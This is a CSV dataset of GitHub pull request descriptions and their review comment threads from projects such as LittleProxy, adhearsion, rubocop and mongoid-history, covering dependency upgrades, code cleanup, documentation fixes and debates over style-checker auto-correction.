,gh_project_name,gh_pull_req_num,gh_pr_original_comment,gh_comments
143,adamfisk/LittleProxy,72.0,"This set of changes upgrades LittleProxy to use Netty 4.0.6.Final.

- The unit tests pass
- CoAdvisor shows no regressions
- I've been using the proxy for surfing and it seems to generally hold up okay for popular sites","['Nice work @oxtoacart! #oxrocks', '@skivvies - aw shucks, thanks!\r\n\r\n@adamfisk - it sure was nice getting to read code that\'s comprehensible and well structured.\r\n\r\n\r\nCheers,\r\nOx\r\n\r\n------------------------------------------------------------------------------------\r\n\r\n""I love people who harness themselves, an ox to a heavy cart,\r\nwho pull like water buffalo, with massive patience,\r\nwho strain in the mud and the muck to move things forward,\r\nwho do what has to be done, again and again.""\r\n\r\n- Marge Piercy\r\n\r\n\r\n\r\n-----BEGIN PGP PUBLIC KEY BLOCK-----\r\nVersion: OpenPGP.js v.1.20130712\r\nComment: http://openpgpjs.org\r\n\r\nxsBNBFH+6NsBCACxewNAusfWlDC9ORPr9Rvt8N4pl8y0w2R33lIuDRVYDCOp\r\naROnCGK0+nLeG8AZCpktvOoApRYuVH8GL+Fk/6Nn4XBfE2abM7jGwtfjV2f2\r\nicLmwaGy8t6jkVDcv+yuflrhixFvSZuJzn6dY9b7c4jvT013JsTzs7cNwGac\r\ngCOLHun/xNuAlD5DfmqwDf7h88B75Dth1s3XMj6LDoiGVBXq8LuMm87hHreS\r\n/5CSREkeR81ihRXzfkujUxkGaURv7b1egop6BSPJEtwNuaw84OrDT6duSzBa\r\na5KoC/8WTYBEdkcNULQfULo+ZR6VdLCusNSbARz8/Dk7IBHRFcY5B/PfABEB\r\nAAHNG094IENhcnQgPG94QGdldGxhbnRlcm4ub3JnPsLAXAQQAQgAEAUCUf7o\r\n3gkQIbFNZUhWmE4AAMnCCACh7FbYaEsx1Z7WIuzEgyrKaRS4k9Fjw1BoAKAW\r\ndKOh+pkV/0r1qy2x603SOlqK7fFYwMuiPqpqF7AVQn2PchSGPEiO8d5LVJ4k\r\naWJSI/r4gPddzl3nRKkBRFxLtDGyEKXUJAZLVa/H+727W64WjI4/nmUlHbJl\r\nG4ukKHSXXcZaptGk7+OALopEGJIpfinLOciauRE6vzJp3/TW8h7PAGtpaugB\r\ny2AFU319KmDACdluR7yQjMnoNKTHy/C/KAgBkNUt3kYL8HbGsx6ciKGwkd+w\r\nVTFsaS3G+05Qm1PYZVzDBggEdcLZ0xA5BqaN55PgzLdRvZGKFyjmPsgW1HhB\r\nWAwN\r\n=iaKQ\r\n-----END PGP PUBLIC KEY BLOCK-----\r\n\r\nOn Aug 12, 2013, at 4:36 PM, skivvies <notifications@github.com> wrote:\r\n\r\n> Nice work @oxtoacart! #oxrocks\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> ', 'Hey @oxtoacart thanks for all your great work on this! Merging.']"
144,adelevie/parse-ruby-client,87.0,Rcov can run only on ruby 1.8.7 see issue: https://github.com/adelevie/parse-ruby-client/issues/86,['Coverage is optional enable via ENV variable\r\n```bash\r\nCOVERAGE=true bundle exec rake\r\n```']
145,adhearsion/adhearsion,495.0,"In past discussion we’ve come to the conclusion that autoloading isn’t adding anything to the code since we already explicitly tell the autoloader the dependencies to load. In addition, in many cases we have to eager-load. All that autoload is doing is slowing down the normal process of requiring files.

The immediate cause for this work was the fact that `require ‘adhearsion/rspec’` was failing because of autoloader failing to resolve a dependency between `Adhearsion::CallController` and `Adhearsion::CallController::Dial`.

Along the way this also fixed some other previously masked bugs:

* PunchblockPlugin was defined as inheriting from Plugin in one place and not another
* At least three classes never existed and were never referenced, but were made available via autoload:
  - Adhearsion::CallController::MenuDsl::Exceptions
  - Adhearsion::Dispatcher
  - Adhearsion::Plugin::Configuration","[""Could you say something more about the motivation for this? I get that it's preferable to move the pain of loading these up-front before calls get processed, but there has to have been something more specific to trigger this PR. I'd like to see that in the commit message (and for this to be squashed before merging).\r\n\r\nAdditionally, I wonder if this is introducing unnecessary pain loading code that might not be used in any individual application? There's certainly room for things like generators not to be loaded except when they're used (by the CLI)."", ""I started down this path because the autoloaders were apparently failing to work out a dependency between `CallController` and `CallController::Dial` when I was attempting to `require 'adhearsion/rspec'`.  Also, we've talked about getting rid of autoload in the past, so I just used that as the excuse."", 'So I\'d like to see some record of that failure (an issue tagged in this commit\'s message or in the commit message itself). It may seem like nit-picking, but I\'m becoming decreasingly tolerant of commit messages which do not appropriately communicate motivation for their change and the confusion they leave behind when someone asks ""why?"" in the future.', ""@benlangfeld I've fed the hounds. Ready to merge?"", 'Travis says no...', 'Those specs are also failing on develop ', 'Then go ahead and merge.']"
146,adhearsion/adhearsion,518.0,I took a look at all the places we used `logger.info` to make sure the messages contained useful information. This is important because INFO is the default level for production apps.,"[""So I dunno what's up with JRuby, but Travis thinks it's really broken.  None of those errors are from these changes though."", 'This is good to go other than JRuby.', ""Just that one complaint where I think you removed useful info. Once that's resolved, a squash and then merge would be fine :)"", 'Log message adjusted, rebased & squashed']"
147,apache/tajo,156.0,TAJO-1062: Update TSQL documentation,"[""Hi @mhthanh \r\n\r\nThank you for your detailed review.\r\nI've just updated the patch by your opinions.\r\nIf possible, could you check it again?\r\n\r\nThanks\r\nJaehwa"", 'Hi @blrunner,\r\nI have checked the patch again. It looks good except 2 minor typos:\r\n+ In file ""meta_command.rst"", Line 6, ""anything command"" -> ""any command""\r\n+ In file ""single_command.rst"", Line 7, ""queries separated"" -> ""queries are separated""\r\n\r\nAfter you fix these typos, you automatically get +1 from me ;-)\r\nActually, I like your patch and I think that Tajo needs many more detailed documents like this one.', ""Hi @mhthanh \r\n\r\nReally thank you for your detailed review.\r\nI've just updated it. :)\r\n"", 'The patch looks nice to me. I leaved some trivial comments.', ""Hi @hyunsik \r\n\r\nThank you for your review.\r\nI've just updated the patch.\r\nIf possible, could you check it again?"", ""Hi @hyunsik \r\n\r\nI agree with your opinion.\r\nI've just renamed the file. :)"", '+1 ship it.']"
148,aq1018/mongoid-history,131.0,"This make it possible to get specific version of an object: ```object.undo(nill, from: <version>, to: object.version)```","['\n[![Coverage Status](https://coveralls.io/builds/1740544/badge)](https://coveralls.io/builds/1740544)\n\nCoverage decreased (-0.38%) when pulling **a83e39e6c3bc201b3e49d25d9e47cdbdf646d8ec on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'This needs tests, CHANGELOG, and README updates, please. ', '\n[![Coverage Status](https://coveralls.io/builds/1759699/badge)](https://coveralls.io/builds/1759699)\n\nCoverage increased (+0.0%) when pulling **6a4a4e895535fe2c885a9f5ff11d038dd571cdd9 on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'Thank you for the heads up! Tests, CHANGELOG, and README updates added, please take a look.', ""See my comments, it's getting closer. Make sure to fix the build and once everything is cleaned up, squash your commits, please."", '\n[![Coverage Status](https://coveralls.io/builds/1760241/badge)](https://coveralls.io/builds/1760241)\n\nCoverage increased (+0.2%) to 99.405% when pulling **e4646f271fde4299cf63c9e51298ec6c88c658ad on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', '""I also would like an explicit test that undo! is just undo + save!."" \xe2\x80\x94 could you please provide an example of test you want to have for it? Thanks.', '\n[![Coverage Status](https://coveralls.io/builds/1760600/badge)](https://coveralls.io/builds/1760600)\n\nCoverage increased (+0.0%) when pulling **53261d83f498d982a6d14144b6909693793aa281 on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'This is good, squash your commits and this is good to go.\r\n\r\nThe undo/save test would still be nice. I am thinking something like this:\r\n\r\n```ruby\r\nit ""implements undo! in terms of undo and save!"" do\r\n    commment = ...\r\n    expect(comment).to receive(:undo)\r\n    expect(comment).to receive(:save!)\r\n    comment.undo! ...\r\nend\r\n```', '\n[![Coverage Status](https://coveralls.io/builds/1761928/badge)](https://coveralls.io/builds/1761928)\n\nCoverage increased (+0.0%) when pulling **9ae9b50f06eea6ca4c39f1dda1ae8ab634f500bd on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'Merged, thank you.']"
149,asciidoctor/asciidoctor,181.0,"- put all code inside an Asciidoctor module block
- moved debug operations into Debug submodule
- optimized block matching by using a single regexp
- added support for fenced code blocks (issue #118)

I anticipate this pull request will cause a (potentially tricky) merge conflict after the ones submitted in the last day are merged. Just let me know when you get those done and I'll rebase this one.","['This whole thing is so much win.', ':+1: ', 'I did a force push with the requested changes to sync the branch w/ upstream/master', 'Are we good to go on this?']"
150,asm-helpful/helpful-web,138.0,"Closes https://assemblymade.com/helpful/wips/295

This also merges in @galkon's work from https://github.com/asm-helpful/helpful-web/pull/137","[""Cheers for making those changes to the buttons. I was unaware you could use\narchive and unarchive as attributes to change the archived field. We may as\nwell of made it a status field rather than a boolean :p\n\nOn Friday, March 14, 2014, Patrick Van Stee\n<notifications@github.com<javascript:_e(%7B%7D,'cvml','notifications@github.com');>>\nwrote:\n\n> Closes https://assemblymade.com/helpful/wips/295\n>\n> This also merges in @galkon <https://github.com/galkon>'s work from #137<https://github.com/asm-helpful/helpful-web/pull/137>\n> ------------------------------\n> You can merge this Pull Request by running\n>\n>   git pull https://github.com/vanstee/helpful-web inbox-queue\n>\n> Or view, comment on, or merge it at:\n>\n>   https://github.com/asm-helpful/helpful-web/pull/138\n> Commit Summary\n>\n>    - Removed random inline javascript that did not look like it was doing\n>    anything important. Added conditional logic around showing different\n>    buttons when the conversation is archived and unarchived.\n>    - Remove unused code\n>    - Create a service object to handle conversation actions\n>    - Install pry for debugging\n>    - Use timecop for time related tests\n>    - Wrap up conversation actions in some tests\n>    - Use the conversation manager to handle simple actions\n>    - Order conversations in the inbox like a queue\n>    - Merge branch 'pull/137' into inbox-queue\n>    - Fix up archive and unarchive buttons\n>    - Reverse order of conversations\n>    - Add button to move conversations to bottom of queue\n>\n> File Changes\n>\n>    - *M* Gemfile<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-0>(2)\n>    - *M* Gemfile.lock<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-1>(10)\n>    - *M* app/assets/stylesheets/modules/conversation.css.scss<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-2>(15)\n>    - *M* app/controllers/conversations_controller.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-3>(4)\n>    - *M* app/models/conversation.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-4>(9)\n>    - *A* app/models/conversation_manager.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-5>(40)\n>    - *M* app/models/conversations_inbox.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-6>(6)\n>    - *M* app/views/conversations/_conversation.html.erb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-7>(17)\n>    - *M* app/views/conversations/_row.html.erb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-8>(28)\n>    - *A* spec/controllers/conversations_controller_spec.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-9>(58)\n>    - *M* spec/factories/users.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-10>(10)\n>    - *A* spec/models/conversation_manager_spec.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-11>(29)\n>\n> Patch Links:\n>\n>    - https://github.com/asm-helpful/helpful-web/pull/138.patch\n>    - https://github.com/asm-helpful/helpful-web/pull/138.diff\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/asm-helpful/helpful-web/pull/138>\n> .\n>""]"
151,asm-helpful/helpful-web,350.0,Automates the awarding of this: https://assembly.com/helpful/bounties/904,[]
152,attr-encrypted/attr_encrypted,137.0,reopen of https://github.com/attr-encrypted/attr_encrypted/pull/117,"['@billymonk any outstanding concerns?', ""Hi @tamird,\r\n\r\nThanks for making the changes. I'll merge in once tests are passing. Please take a look at the failing test on AR 4.\r\n\r\nLooks like it is only `test_should_set_attributes_regardless_of_arguments_order`. Maybe that was related to moving the method definition out of the if/else conditional? If that test was relying on that change then I think we should remove that test and we could introduce the change in another pull request.\r\n\r\nThanks!\r\n"", '@billymonk done', '@billymonk ping']"
153,azkaban/azkaban,362.0,"... auto-fix feature.

This pull request will add 3 additional azkaban configs:
project.validators.fix.prompt controls whether to show the auto-fix related UI
project.validators.fix.lable controls the content of the auto-fix label
project.validators.fix.link sets the link which contains the detailed information about the auto-fix feature.","['Looks good, apart from some minor comments.', 'Updated the pull request addressing these comments. ', 'Apart from minor comments, LGTM!', 'Updated the pull request.', 'LGTM!']"
154,bbatsov/rubocop,551.0,"It's quite common to make function calls such as `where({ x: 1 })`, in which case the curly braces are not required and you can write `where(x: 1)`. The `BracesInHashParameters` supports both a `required` (default) and a `none` style, keeping things consistent either way.
","[""This cop would be very useful for me! One question: should the default be `{ EnforcedStyle: none }` per the default [style guide](https://github.com/bbatsov/ruby-style-guide)?\r\n\r\n> Omit the outer braces around an implicit options hash.\r\n>\r\n```ruby\r\n# bad\r\nuser.set({ name: 'John', age: 45, permissions: { read: true } })\r\n>\r\n# good\r\nUser.set(name: 'John', age: 45, permissions: { read: true })\r\n```"", ""@dblock This cop seems like a good idea. I've added some source code comments. I agree with @fancyremarker that the default should be to not have braces. Oh, and you also need to make sure that the source code passes `rubocop`'s own inspection!"", 'Updated with all the suggested changes/fixes. Enforcing the default style of `BracesAroundHashParameters` to `none`.', ""Added a few more comments. Sorry I didn't write them all at once.\r\n\r\nI noticed you chose to stick with `required`/`none` rather than `braces`/`no_braces`. What was your motivation for that?"", 'Renamed `none` and `required` to `no_braces` and `braces`, yours is better. ', 'Updated, squashed. Please re-review. Happy to make more changes as you see fit.', 'Updated again, squashed. Not using a regexp anymore, thanks for insisting, this is a lot better.', ""@dblock :-) Code looks good now. You'll have to rebase on top of the current `master`, since there is a merge conflict right now."", ""Here're you go."", 'Thanks!']"
155,bbatsov/rubocop,869.0,"see https://github.com/bbatsov/rubocop/issues/868

Feel free to propose changes.","['\n[![Coverage Status](https://coveralls.io/builds/589755/badge)](https://coveralls.io/builds/589755)\n\nCoverage remained the same when pulling **ced0eea2a9f6a08cdf7d95701d82337e571e1a51 on geniou:nested_style** into **fbe3ed902749bb4a9b9775a4d4b97828c5f982ef on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/590666/badge)](https://coveralls.io/builds/590666)\n\nCoverage remained the same when pulling **30a35a31faa5a21b32f04bf9db1fe3aac776f639 on geniou:nested_style** into **fbe3ed902749bb4a9b9775a4d4b97828c5f982ef on bbatsov:master**.\n', 'I adapted the code to make it configurable. @bbatsov please have a look.', '\n[![Coverage Status](https://coveralls.io/builds/590837/badge)](https://coveralls.io/builds/590837)\n\nCoverage remained the same when pulling **f5f673050d38b671f33feadb5a4ba19fcc83e41f on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/590844/badge)](https://coveralls.io/builds/590844)\n\nCoverage remained the same when pulling **bcb70dd9c9a7ae60aaef1beafcbf1f38475a8f7a on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/590851/badge)](https://coveralls.io/builds/590851)\n\nCoverage remained the same when pulling **b7e471d62700890bbfd658bb01ace6efb3c808f9 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '@bbatsov please have a look again.', '\n[![Coverage Status](https://coveralls.io/builds/591016/badge)](https://coveralls.io/builds/591016)\n\nCoverage remained the same when pulling **7f7da9bf3a65f11ce1da94b7061fbc3167bfdce5 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/591036/badge)](https://coveralls.io/builds/591036)\n\nCoverage remained the same when pulling **126458b2062a201f4cb971f7db97a73389cd7084 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/591089/badge)](https://coveralls.io/builds/591089)\n\nCoverage remained the same when pulling **3718dd837742219fcddc9947efb06c4a4bd5a267 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '@jonas054 @yujinakayama Remarks from you would be most welcome as well!', '@bbatsov like this?', '\n[![Coverage Status](https://coveralls.io/builds/591979/badge)](https://coveralls.io/builds/591979)\n\nCoverage remained the same when pulling **66ab985bbb05addf09a7fdda99ddb3561fa502e9 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/591979/badge)](https://coveralls.io/builds/591979)\n\nCoverage remained the same when pulling **66ab985bbb05addf09a7fdda99ddb3561fa502e9 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', ""@jonas054 thanks for your hints. Is is fine like this?\r\n\r\nI'm not sure about the naming. I think there are no official names for these two styles. I hope `nested` and `compact` is clear enough."", 'Looks good. Just some final remarks. I noticed a couple of typos in your commit messages:\r\n\r\n* fulfill -> fulfil (I\'d rephrase this to ""Fix offenses reported by...""\r\n* alingment -> alignment\r\n\r\nI\'d also suggest to start all commit messages with an uppercase letter.', '@bbatsov sorry for the typos - now they are fixed.', 'Thanks!', '@bbatsov Thank you for your patience!', ""@bbatsov A small heads-up. The spelling _fulfill_ is actually correct American English according to [the dictionary](http://www.oxforddictionaries.com/definition/american_english/fulfill). It doesn't matter now since @geniou rephrased it, and the word doesn't occur anywhere in our code base or in any commit message.""]"
156,bbatsov/rubocop,1072.0,,"['RuboCop offenses fixed. :pensive: ', 'Seems OK to me. @yujinakayama @jonas054 What do you think?', ""I think this cop should not support auto-correction. The purpose of the cop is only to remind the user of the existence of unused arguments, and it does not know what correct code is.\r\n\r\nHere are possible cases:\r\n\r\n#### Overriding or conforming to some protocol\r\n\r\n```ruby\r\nclass SomeBaseClass\r\n  def some_method(foo, bar)\r\n    puts foo, bar\r\n  end\r\nend\r\n\r\nclass SomeClass < SomeBaseClass\r\n  def some_method(foo, bar) # This should be `_bar`\r\n    puts foo\r\n  end\r\nend\r\n```\r\n\r\n#### Typos\r\n\r\n```ruby\r\ndef some_method(foo, ber) # This should be `bar`.\r\n  puts bar\r\nend\r\n\r\ndef some_method(foo, bar)\r\n  puts ber # This should be `bar`.\r\nend\r\n```\r\n\r\n#### Definitely useless arguments\r\n\r\n```ruby\r\ndef some_method(foo, bar) # This `bar` can be removed.\r\n  puts foo\r\nend\r\n\r\nsome_method('FOO', 'BAR') # This invocation also needs to be updated.\r\n```\r\n\r\nSo, I think the auto-correction is actually not correcting the issues, it's suppressing them.\r\n"", '@yujinakayama I see your point, at the same time auto-correct for these cops helps bringing a code-base to explicitly conform to the them, this might not be ideal, but very helpful. After the running the auto-correct developers finding arguments prefixed with `_` might consider removing them, and altering their callers.', ""@bbatsov I'd appreciate some suggestions for more descriptive example titles."", '> this might not be ideal, but very helpful. After the running the auto-correct developers finding arguments prefixed with _ might consider removing them, and altering their callers.\r\n\r\nI think tools should lead users to the appropriate way by its implementation. The offense for the unused arguments is the best chance to notice the issues. Once they are suppressed, users need to _carefully_ check them again. RuboCop is a tool to find out _careless_ issues.', ""@yujinakayama Yeah, I guess the question is whether the appropriate way is the idealistic or pragmatic one. Generally I'd say that auto-correct would be the pragmatic way, except for the case when it makes semantic changes (see #1047)."", ""I think you have  always the chance to decide if you want to autocorrect or not, and afterwards you see the changes and can decide if you can keep them or have to change something. So I'm I'm favor of it."", ""@yujinakayama As usual, I'm with you 100%. That said, I recognise that some people don't view the situation like we do and we should cater to their needs as well. I'm thinking that the levels of auto-correct proposed in #950 will largely solve such problems. I'm also thinking we can additionally introduce a global cop config that can disable auto-correct (say `EnableAutocorrect`).\r\n\r\nCops like those two in question will support auto-correct, but have it disabled by default. Generally speaking, lint cops rarely have a straight-forward auto-correction path.\r\n\r\nHow does this sound? /cc @jonas054 "", ""@bbatsov \r\n\r\n> I'm thinking that the levels of auto-correct proposed in #950 will largely solve such problems.\r\n\r\nIt seems to be reasonable, since my biggest concern is that this auto-correction makes average users (who don't know the auto-correction behaves like that) overlook the underlying issues. Probably the aggressive auto-correction mode should be designed for the opt-out adjustment approach as @hannestyden said and it should output some warnings on run."", ""Yep, that sounds totally reasonable. I'll merge this PR now and check how's the progress on #950."", 'For me the only important issue is that there is a possibility to run pragmatic auto-correct. The use-case for me is (and has already been) making a large code base that has been developed without these style guides (or without having them properly enforced). In that case I find it better that the lingering `_`-prefixed variables are cleaned up as they are found.\r\n\r\nOTOH, in a project where this style is actively enforced I totally agree with @yujinakayama.\r\n\r\nGiven that there is support for different levels of auto-correct, I suggest that auto-correct should be **opt-in**, and that instructions or hints how to enable the particular level is communicated, e.g.\r\n\r\n> `# Cop supports --auto-correct agressive`\r\n\r\nor similar.\r\n\r\n(While writing this the PR was merged. :smile:)\r\n\r\n']"
157,bbatsov/rubocop,1236.0,"Currently, the AndOr cop bans the use of keywords 'and' and 'or'
completely. This patch adds a configuration option `OnlyCheckConditionals`
which when set, restricts the AndOr cop to only conditionals.","['First draft. Let me know if there is any thing I should change.', 'Good start, but testing needs to be improved. Also, you need to add the new parameter in `config/default.yml` and update the changelog.', '@jonas054 I have updated with the suggested changes and more tests', '\n[![Coverage Status](https://coveralls.io/builds/1029164/badge)](https://coveralls.io/builds/1029164)\n\nCoverage decreased (-0.05%) when pulling **11b3b2517535b459e38fefb2dd7c1101db7e36bd on vrthra:fix/1232/configurable_andor** into **9548befeec193d16d39a576d7744bb3bc3c831ec on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029602/badge)](https://coveralls.io/builds/1029602)\n\nCoverage decreased (-0.07%) when pulling **503bc3764c818461dcc4abc0112a2de225af7eb7 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029624/badge)](https://coveralls.io/builds/1029624)\n\nCoverage decreased (-0.05%) when pulling **f2cb07ebccb2ecc5df19eac2976b1f586f44ce08 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029692/badge)](https://coveralls.io/builds/1029692)\n\nCoverage decreased (-0.05%) when pulling **f2cb07ebccb2ecc5df19eac2976b1f586f44ce08 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029964/badge)](https://coveralls.io/builds/1029964)\n\nCoverage decreased (-0.04%) when pulling **b119a38add5d5547931cfbef3598f4a6d1c441a9 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029964/badge)](https://coveralls.io/builds/1029964)\n\nCoverage decreased (-0.04%) when pulling **b119a38add5d5547931cfbef3598f4a6d1c441a9 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1030604/badge)](https://coveralls.io/builds/1030604)\n\nCoverage decreased (-0.03%) when pulling **3a1efe865cf765f0c0005194bf533cd08e276199 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1033779/badge)](https://coveralls.io/builds/1033779)\n\nCoverage decreased (-0.01%) when pulling **fc85932c2396033f7491379a4cf4218072a4b1f4 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1033851/badge)](https://coveralls.io/builds/1033851)\n\nCoverage increased (+0.0%) when pulling **b5d1c066ba3c52239a0ae0c1a210195e34119162 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1034399/badge)](https://coveralls.io/builds/1034399)\n\nCoverage increased (+0.0%) when pulling **a21631e01c055db11f33aca6655659ebba4f1af9 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', 'Looks good to me; the latest change was a massive improvement. We should have suggested them sooner. @jonas054 do you have more remarks?', ""Yes, that's much better. I'm satisfied."", 'Thanks for your work on this @vrthra!']"
